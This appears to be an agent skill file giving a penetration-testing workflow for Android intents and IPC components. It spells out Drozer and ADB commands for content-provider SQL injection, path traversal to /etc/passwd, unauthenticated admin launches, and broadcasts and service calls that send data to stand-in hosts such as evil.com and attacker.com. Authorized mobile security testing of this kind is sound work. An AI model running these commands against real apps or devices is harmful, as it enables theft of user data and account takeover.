---
name: mobile-testing-android-intents-for-vulnerabilities
description: Tests Android inter-process communication (IPC) through intents for vulnerabilities including intent injection, unauthorized component access, broadcast sniffing, pending intent hijacking, and content provider data leakage.
domain: mobile
category: apk-analysis
hide: true
license: Apache-2.0
metadata:
  manifest_entry: src/corpus/mobile-testing-android-intents-for-vulnerabilities/SKILL.md
---
# Testing Android Intents for Vulnerabilities

## When to Use

Use this skill when:
- Assessing Android app exported activities, services, receivers, and content providers
- Testing for intent injection and unauthorized component invocation
- Evaluating broadcast receiver security for sensitive data exposure
- Performing IPC-focused penetration testing on Android applications

**Do not use** on production devices without explicit authorization.


## 1. Operational Decision Tree

```text
                 [Android Package Decompiled & Analyzed]
                                    │
                                    ▼
                   [Inspect AndroidManifest.xml IPC]
             Check targetSdkVersion (API 31+ vs legacy)
             Identify android:exported="true" components
                                    │
             ┌──────────────────────┼──────────────────────┐
             ▼                      ▼                      ▼
    [Exported Activities]   [Broadcast Receivers]  [Content Providers]
             │                      │                      │
             ▼                      ▼                      ▼
    [Intent Redirection]   [Broadcast Sniffing]   [Query & Path Injection]
    - Deep link fuzzing    - Extract auth tokens  - content query URI
    - Auth bypass flows    - Inject fake alerts   - SQLi in projection
    - am start invocation  - am broadcast         - Traversal in openFile
             │                      │                      │
             └──────────────────────┼──────────────────────┘
                                    │
                                    ▼
                   [PendingIntent Mutability Audit]
               Check FLAG_MUTABLE without FLAG_IMMUTABLE
               Hijack target action & component destination
                                    │
                                    ▼
                   [Tripartite Verification Oracle]
               Positive UI/Data + Negative Control + Diff
                                    │
                                    ▼
                   [Evidence Ledger Registration]
            arsenal append-evidence --case $CASE_ID --tool adb ...
```

## Most Often Missed & How to Confirm

- **`exported` default by SDK level** — a component with no `android:exported` is exported below API 31, private at 31+. Confirm the effective state against `targetSdkVersion`, not the manifest alone.
- **Permission-guarded exported components** — confirm by invoking with and without the required permission; only the unprotected case is a finding.
- **Mutable PendingIntents** — confirm by hooking `PendingIntent.getActivity` and checking for `FLAG_MUTABLE` (0x02000000) without `FLAG_IMMUTABLE`.
- **Content provider SQLi / traversal** — confirm with `scanner.provider.injection`/`traversal` and a `UNION SELECT` proving data extraction.
- **Broadcast data leakage** — confirm by sniffing an exported action with `app.broadcast.sniff` and capturing sensitive extras.
- **Implicit vs explicit intents** — confirm only implicit (action-based) components are reachable by other apps before reporting.

## Prerequisites

- Rooted Android device or emulator with ADB
- Drozer agent installed on target device (`drozer agent.apk`)
- Drozer console on host (`pip install drozer`)
- Target APK decompiled with apktool for AndroidManifest.xml analysis
- Frida for runtime intent monitoring

## Workflow

### Step 1: Enumerate Exported Components

```bash
# Using Drozer
drozer console connect
run app.package.info -a com.target.app
run app.package.attacksurface com.target.app

# Output shows:
# X activities exported
# X broadcast receivers exported
# X content providers exported
# X services exported

# List exported activities
run app.activity.info -a com.target.app

# List exported services
run app.service.info -a com.target.app

# List exported receivers
run app.broadcast.info -a com.target.app

# List content providers
run app.provider.info -a com.target.app
```

### Step 2: Test Exported Activities

```bash
# Launch exported activities directly
run app.activity.start --component com.target.app com.target.app.AdminActivity

# Launch with intent extras
run app.activity.start --component com.target.app com.target.app.ProfileActivity \
  --extra string user_id 1337

# Test intent injection via data URI
adb shell am start -a android.intent.action.VIEW \
  -d "content://com.target.app/users/admin" com.target.app

# If admin activity opens without auth, report as authorization bypass
```

### Step 3: Test Broadcast Receivers

```bash
# Send broadcast to exported receivers
run app.broadcast.send --action com.target.app.PROCESS_PAYMENT \
  --extra string amount "0.01" --extra string recipient "attacker"

# Sniff broadcasts for sensitive data
run app.broadcast.sniff --action com.target.app.USER_LOGIN

# Via ADB
adb shell am broadcast -a com.target.app.RESET_PASSWORD \
  --es email "attacker@evil.com"
```

### Step 4: Test Content Providers

```bash
# Query content providers for data leakage
run app.provider.query content://com.target.app.provider/users
run app.provider.query content://com.target.app.provider/users --projection "password"

# Test SQL injection in content providers
run app.provider.query content://com.target.app.provider/users \
  --selection "1=1) UNION SELECT username,password FROM users--"

# Test path traversal
run app.provider.read content://com.target.app.provider/../../etc/passwd
run app.provider.download content://com.target.app.provider/../databases/app.db /tmp/stolen.db

# Find injectable providers
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app
```

### Step 5: Test Pending Intent Vulnerabilities

```javascript
// Monitor PendingIntent creation via Frida
Java.perform(function() {
    var PendingIntent = Java.use("android.app.PendingIntent");

    PendingIntent.getActivity.overload("android.content.Context", "int",
        "android.content.Intent", "int").implementation =
        function(context, requestCode, intent, flags) {
            console.log("[PendingIntent] getActivity:");
            console.log("  Intent: " + intent.toString());
            console.log("  Flags: " + flags);

            // Check for FLAG_IMMUTABLE (secure) vs FLAG_MUTABLE (vulnerable)
            var FLAG_MUTABLE = 0x02000000;
            if ((flags & FLAG_MUTABLE) !== 0) {
                console.log("  [VULN] FLAG_MUTABLE - PendingIntent can be modified by receiver");
            }
            return this.getActivity(context, requestCode, intent, flags);
        };
});
```

### Step 6: Test Service Binding

```bash
# Attempt to bind to exported services
run app.service.start --action com.target.app.SYNC_SERVICE \
  --extra string server "https://evil.com/data_sink"

run app.service.send com.target.app com.target.app.MessengerService \
  --msg 1 0 0 --extra string command "dump_database" --bundle-as-obj
```

### Step 7: Native ADB Direct Command Execution Matrix

When Drozer is unavailable, execute tests directly using Android Debug Bridge (ADB):

```bash
# 1. Directly launch exported activity bypassing login screens
adb shell am start -n com.target.app/.ui.AdminDashboardActivity \
  --es "user_role" "admin" \
  --ez "is_authenticated" true

# 2. Trigger exported broadcast receiver with crafted extras
adb shell am broadcast -a com.target.app.ACTION_SYNC \
  --es "sync_url" "https://attacker.com/sink" \
  --ei "priority" 10

# 3. Query unauthenticated Content Provider data
adb shell content query --uri content://com.target.app.provider/users

# 4. Test Content Provider SQL Injection
adb shell content query --uri content://com.target.app.provider/notes \
  --projection "* FROM users;--"

# 5. Test Content Provider Path Traversal (Arbitrary File Read)
adb shell content read --uri content://com.target.app.fileprovider/root/etc/hosts
```

---

## 2. Tripartite Verification Oracle

```text
+---------------------------------------------------------------------------------------+
|                              TRIPARTITE VERIFICATION ORACLE                            |
+---------------------------------------------------------------------------------------+
| 1. POSITIVE ASSERTION       | - Activity: Sensitive screen renders directly on device |
|                             |   without requiring prior login or authentication steps.|
|                             | - Receiver: Process executes payload action or logs     |
|                             |   attributable state modification.                      |
|                             | - Provider: Structured database records or file content |
|                             |   returned to calling shell without SecurityException.  |
+-----------------------------+---------------------------------------------------------+
| 2. NEGATIVE BASELINE        | Attempt identical invocation on non-exported component: |
|    CONTROL                  | adb shell am start -n com.target.app/.PrivateActivity   |
|                             | Verify Android OS throws java.lang.SecurityException:   |
|                             | "Permission Denial: not exported from uid ...".         |
+-----------------------------+---------------------------------------------------------+
| 3. DIFFERENTIAL INVARIANCE  | Verify invocation succeeds across non-root guest profile|
|                             | and third-party unprivileged application sandbox context|
|                             | confirming universal device exploitability.             |
+---------------------------------------------------------------------------------------+
```

---

## 3. Evidence Capture & Ledger Registration

```bash
# 1. Capture extracted database records from content provider
adb shell content query --uri content://com.target.app.provider/users > work/$CASE_ID/evidence/raw/provider_leak.txt

# 2. Append evidence entry to cryptographic audit ledger
arsenal append-evidence \
  --case $CASE_ID \
  --tool adb \
  --file work/$CASE_ID/evidence/raw/provider_leak.txt \
  --desc "Confirmed unauthenticated Android Content Provider data exposure via IPC"
```


## Key Concepts

| Term | Definition |
|------|-----------|
| **Exported Component** | Android component (activity/service/receiver/provider) accessible to other apps on the device |
| **Intent** | Messaging object for requesting actions from other components; can be explicit (target specified) or implicit (action-based) |
| **Pending Intent** | Token wrapping an intent for future execution by another app; mutable PendingIntents can be modified by recipients |
| **Content Provider** | Component for structured data sharing between apps; SQL injection target if query parameters are not sanitized |
| **Broadcast Receiver** | Component receiving system or app broadcasts; exported receivers can be triggered by any app |

## Tools & Systems

- **Drozer**: Android security assessment framework for IPC testing with pre-built modules
- **ADB**: Command-line tool for invoking intents, starting activities, and sending broadcasts
- **Frida**: Runtime monitoring of intent handling and PendingIntent creation
- **apktool**: APK decompilation for AndroidManifest.xml analysis of component export status
- **Intent Fuzzer**: Automated tool for fuzzing intent parameters across exported components

## Common Pitfalls

- **android:exported default changed in API 31**: Components with intent filters default to exported=true below API 31 but exported=false at API 31+. Check targetSdkVersion.
- **Permission-protected components**: An exported component may still require a permission. Test with and without the required permission.
- **Implicit intents vs explicit**: Only implicit intents (action-based) are interceptable by other apps. Explicit intents (specifying target) are secure.
- **Custom permissions**: Apps can define custom permissions with different protection levels (normal, dangerous, signature). Signature-level permissions are only grantable to apps signed with the same certificate.